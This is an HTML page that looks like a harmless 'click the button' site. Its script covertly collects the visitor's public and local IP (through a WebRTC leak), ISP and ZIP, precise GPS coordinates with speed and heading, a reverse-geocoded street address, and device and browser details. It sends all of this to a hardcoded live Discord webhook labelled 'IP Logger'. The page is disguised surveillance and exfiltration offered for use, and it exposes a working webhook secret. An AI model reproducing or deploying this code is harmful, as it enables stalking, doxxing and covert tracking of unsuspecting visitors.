<!DOCTYPE html>
<html>
<head>
    <title>click the button</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; text-align: center; }
        button { padding: 12px 24px; font-size: 16px; background-color: #5865F2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #4752C4; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #status { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        #permissionMessage { margin-top: 20px; color: #ff9800; display: none; }
    </style>
</head>
<body>
    <h1>click the button website thing</h1>
    <p>click the button below:</p>
    
    <button id="trackButton">Click Me</button>
    <div id="permissionMessage">Allow location access for precise coordinates</div>
    <div id="status"></div>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        function detectDevice() {
            const ua = navigator.userAgent.toLowerCase();
            let deviceType = 'Desktop';
            let os = 'Unknown';
            let browser = 'Unknown';
            
            if (/mobile|android|iphone|ipad|ipod|blackberry|iemobile|opera mini|windows phone/i.test(ua)) {
                deviceType = 'Mobile';
            }
            if (/tablet|ipad|android(?!.*mobile)|kindle|silk/i.test(ua)) {
                deviceType = 'Tablet';
            }
            
            if (/windows/.test(ua)) {
                if (/windows nt 5/.test(ua)) os = 'Windows XP';
                else if (/windows nt 6.0/.test(ua)) os = 'Windows Vista';
                else if (/windows nt 6.1/.test(ua)) os = 'Windows 7';
                else if (/windows nt 6.2/.test(ua)) os = 'Windows 8';
                else if (/windows nt 6.3/.test(ua)) os = 'Windows 8.1';
                else if (/windows nt 10/.test(ua)) os = 'Windows 10';
                else if (/windows nt 11/.test(ua)) os = 'Windows 11';
                else os = 'Windows';
            } else if (/mac os x/.test(ua)) os = 'macOS';
            else if (/linux/.test(ua)) os = 'Linux';
            else if (/android/.test(ua)) os = 'Android';
            else if (/iphone|ipad|ipod/.test(ua)) os = 'iOS';
            else if (/cros/.test(ua)) os = 'Chrome OS';
            
            if (/edg/.test(ua)) browser = 'Microsoft Edge';
            else if (/chrome/.test(ua)) browser = 'Google Chrome';
            else if (/firefox/.test(ua)) browser = 'Mozilla Firefox';
            else if (/safari/.test(ua) && !/chrome/.test(ua)) browser = 'Safari';
            else if (/opera|opr/.test(ua)) browser = 'Opera';
            else if (/msie|trident/.test(ua)) browser = 'Internet Explorer';
            else if (/brave/.test(ua)) browser = 'Brave';
            
            return { deviceType, os, browser, userAgent: navigator.userAgent };
        }
        
        async function getLocalIP() {
            return new Promise((resolve) => {
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!RTCPeerConnection) {
                    resolve('WebRTC not supported');
                    return;
                }
                
                const pc = new RTCPeerConnection({ iceServers: [] });
                const ips = [];
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => {});
                
                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        if (ips.length) {
                            resolve(ips[0]);
                        } else {
                            resolve('Not detected');
                        }
                        return;
                    }
                    
                    const candidate = event.candidate.candidate;
                    const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                    const match = candidate.match(regex);
                    
                    if (match) {
                        const ip = match[1];
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                            (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
                            if (!ips.includes(ip)) {
                                ips.push(ip);
                            }
                        }
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips.length ? ips[0] : 'Not detected');
                }, 1000);
            });
        }
        
        async function getIPLocation(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                return {
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown',
                    zip: data.postal || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    lat: data.latitude ? parseFloat(data.latitude).toFixed(6) : 'Unknown',
                    lon: data.longitude ? parseFloat(data.longitude).toFixed(6) : 'Unknown',
                    source: 'IP API'
                };
            } catch (e) {
                return {
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    isp: 'Unknown',
                    zip: 'Unknown',
                    timezone: 'Unknown',
                    lat: 'Unknown',
                    lon: 'Unknown',
                    source: 'Failed'
                };
            }
        }
        
        async function getRealTimeLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({
                        lat: 'Unknown',
                        lon: 'Unknown',
                        accuracy: 'N/A',
                        source: 'Geolocation not supported',
                        timestamp: new Date().toISOString()
                    });
                    return;
                }
                
                const permissionMessage = document.getElementById('permissionMessage');
                permissionMessage.style.display = 'block';
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        permissionMessage.style.display = 'none';
                        resolve({
                            lat: position.coords.latitude.toFixed(6),
                            lon: position.coords.longitude.toFixed(6),
                            accuracy: Math.round(position.coords.accuracy) + ' meters',
                            altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + 'm' : 'N/A',
                            speed: position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A',
                            heading: position.coords.heading ? position.coords.heading + 'Â°' : 'N/A',
                            source: 'Real-time GPS',
                            timestamp: new Date(position.timestamp).toISOString()
                        });
                    },
                    (error) => {
                        permissionMessage.style.display = 'none';
                        let errorMsg = 'Unknown error';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMsg = 'Permission denied';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMsg = 'Position unavailable';
                                break;
                            case error.TIMEOUT:
                                errorMsg = 'Request timeout';
                                break;
                        }
                        resolve({
                            lat: 'Unknown',
                            lon: 'Unknown',
                            accuracy: 'N/A',
                            source: errorMsg,
                            timestamp: new Date().toISOString()
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function reverseGeocode(lat, lon) {
            if (lat === 'Unknown' || lon === 'Unknown') {
                return { address: 'No coordinates' };
            }
            
            try {
                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
                const data = await res.json();
                if (data.address) {
                    return {
                        address: `${data.address.road || ''} ${data.address.house_number || ''}, ${data.address.city || data.address.town || data.address.village || ''}, ${data.address.country || ''}`.trim(),
                        full: data.display_name || 'Unknown address'
                    };
                }
            } catch (e) {
                console.log('Reverse geocoding failed');
            }
            
            return { address: 'Address lookup failed' };
        }
        
        document.getElementById('trackButton').addEventListener('click', async function() {
            const button = this;
            const status = document.getElementById('status');
            
            button.disabled = true;
            button.textContent = 'Getting location...';
            status.style.display = 'none';
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;
                
                const localIP = await getLocalIP();
                
                const ipLocation = await getIPLocation(publicIP);
                
                const realTimeLocation = await getRealTimeLocation();
                
                const deviceInfo = detectDevice();
                
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const screenDepth = screen.colorDepth;
                const pixelRatio = window.devicePixelRatio || 1;
                
                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
                const doNotTrack = navigator.doNotTrack || navigator.msDoNotTrack || 'Unknown';
                const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
                const referrer = document.referrer || 'Direct visit';
                const language = navigator.language || 'Unknown';
                
                let reverseGeocodeResult = { address: 'Not available' };
                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
                    reverseGeocodeResult = await reverseGeocode(realTimeLocation.lat, realTimeLocation.lon);
                }
                
                let mapsLink = 'No coordinates available';
                let gpsMapsLink = 'No GPS coordinates';
                
                if (ipLocation.lat !== 'Unknown' && ipLocation.lon !== 'Unknown') {
                    mapsLink = `https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon}`;
                }
                
                if (realTimeLocation.lat !== 'Unknown' && realTimeLocation.lon !== 'Unknown') {
                    gpsMapsLink = `https://www.google.com/maps?q=${realTimeLocation.lat},${realTimeLocation.lon}`;
                }
                
                const now = new Date();
                const dateStr = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()}`;
                let hours = now.getHours();
                const ampm = hours >= 12 ? 'PM' : 'AM';
                hours = hours % 12;
                hours = hours ? hours : 12;
                const timeStr = `${hours.toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} ${ampm}`;
                
                const embed = {
                    title: "IP TRACKED! - RESULTS",
                    color: 16711680,
                    fields: [
                        {
                            name: "NETWORK INFORMATION",
                            value: `Public IP: ${publicIP}\nLocal IP: ${localIP}\nISP: ${ipLocation.isp}`,
                            inline: true
                        },
                        {
                            name: "IP BASED LOCATION",
                            value: `City: ${ipLocation.city}\nRegion: ${ipLocation.region}\nCountry: ${ipLocation.country}\nCoordinates: ${ipLocation.lat}, ${ipLocation.lon}\nGoogle Maps: ${mapsLink}`,
                            inline: true
                        },
                        {
                            name: "REAL-TIME GPS LOCATION",
                            value: `Latitude: ${realTimeLocation.lat}\nLongitude: ${realTimeLocation.lon}\nAccuracy: ${realTimeLocation.accuracy}\nSpeed: ${realTimeLocation.speed}\nHeading: ${realTimeLocation.heading}\nGPS Maps: ${gpsMapsLink}`,
                            inline: true
                        },
                        {
                            name: "ADDRESS FROM GPS",
                            value: `Address: ${reverseGeocodeResult.address.substring(0, 100)}${reverseGeocodeResult.address.length > 100 ? '...' : ''}\nSource: ${realTimeLocation.source}\nGPS Time: ${new Date(realTimeLocation.timestamp).toLocaleTimeString()}`,
                            inline: true
                        },
                        {
                            name: "DEVICE INFORMATION",
                            value: `Device Type: ${deviceInfo.deviceType}\nOperating System: ${deviceInfo.os}\nBrowser: ${deviceInfo.browser}\nScreen: ${screenWidth}x${screenHeight}\nLanguage: ${language}`,
                            inline: true
                        },
                        {
                            name: "BROWSER & SESSION",
                            value: `Cookies: ${cookiesEnabled}\nDo Not Track: ${doNotTrack}\nOnline: ${onlineStatus}\nReferrer: ${referrer.substring(0, 40)}${referrer.length > 40 ? '...' : ''}\nTime: ${timeStr} ${dateStr}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `Location Sources: ${ipLocation.source} + ${realTimeLocation.source}`
                    },
                    timestamp: new Date().toISOString()
                };
                
                const discordMessage = {
                    embeds: [embed],
                    username: "IP Logger"
                };
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discordMessage)
                });
                
                if (response.ok) {
                    status.textContent = 'hi bro.';
                    status.style.color = '#4CAF50';
                    status.style.backgroundColor = '#E8F5E9';
                } else {
                    throw new Error('Discord error');
                }
                
            } catch (error) {
                console.error('Error:', error);
                status.textContent = 'uh error pls try again';
                status.style.color = '#F44336';
                status.style.backgroundColor = '#FFEBEE';
            } finally {
                button.disabled = false;
                button.textContent = 'click me';
                status.style.display = 'block';
            }
        });
    </script>
</body>
</html>
